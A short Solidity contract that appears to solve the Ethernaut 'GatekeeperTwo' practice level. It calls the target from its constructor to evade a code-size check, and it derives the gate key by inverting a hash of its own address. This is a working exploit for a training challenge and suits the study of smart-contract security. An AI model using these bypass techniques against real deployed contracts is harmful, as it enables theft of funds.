// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "../gatekeeper2/GatekeeperTwo.sol";
contract GatekeeperTwoHack {

  constructor(address instance) {
    bytes8 _gateKey = ~bytes8(keccak256(abi.encodePacked(address(this))));
    GatekeeperTwo gatekeeper = GatekeeperTwo(instance);
    gatekeeper.enter(_gateKey);
  }
}
